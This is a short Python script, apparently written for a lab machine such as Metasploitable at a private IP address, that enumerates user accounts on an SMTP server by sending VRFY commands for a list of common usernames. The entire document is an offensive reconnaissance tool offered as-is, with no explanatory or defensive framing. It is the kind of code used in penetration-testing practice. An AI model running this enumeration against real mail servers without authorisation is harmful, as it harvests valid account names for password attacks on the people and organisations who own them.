import smtplib

target_ip = "192.168.153.129"
port = 25

# List of usernames to test
usernames = ["root", "admin", "msfadmin", "user", "guest", "mail", "www", "service"]

def smtp_user_enum(target_ip, port, usernames):
    # Connect to the SMTP server
    server = smtplib.SMTP(target_ip, port)
    print("Starting user enumeration...")
    
    for user in usernames:
        # Send VRFY command
        response_code, response_message = server.docmd("VRFY", user)
        
        # Check the responses
        if response_code == 252:
            print(f"[+] User found: {user}")
        else:
            print(f"[-] User not found: {user}")
    
    server.quit()

smtp_user_enum(target_ip, port, usernames)
